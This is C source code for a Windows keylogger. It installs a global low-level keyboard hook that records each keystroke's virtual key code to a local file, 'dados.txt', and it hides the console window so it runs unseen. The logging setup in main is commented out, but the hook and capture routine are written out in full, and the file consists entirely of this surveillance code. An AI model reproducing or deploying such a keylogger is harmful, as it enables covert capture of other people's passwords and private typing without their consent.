#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

FILE *fp;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_SYSKEYUP:
        {
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
            
            if (fp) {
                fprintf(fp, "%c", p->vkCode);
                fflush(fp);
            }
            break;
        }
        }
    }

    return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI TheKeyLogger(LPVOID lpParameter)
{
    HINSTANCE hinstExe = GetModuleHandle(NULL);
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe, 0);

    MessageLoop();

    UnhookWindowsHookEx(hhkLowLevelKybd);
    return 0;
}

int main(int argc, char **argv)
{
    
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

  /* fp = fopen("dados.txt", "a");
    if (fp == NULL) {
        printf("Erro ao abrir o arquivo.\n");
        return 1;
    }

    HANDLE hThread;
    DWORD dwThread;

    hThread = CreateThread(NULL, 0, TheKeyLogger, NULL, 0, &dwThread);

    if (hThread)
    {
        WaitForSingleObject(hThread, INFINITE);
    }
    else
    {
        printf("Erro ao criar a thread.\n");
        fclose(fp);
        return 1;
    }

    fclose(fp);
    */

    return 0;
}
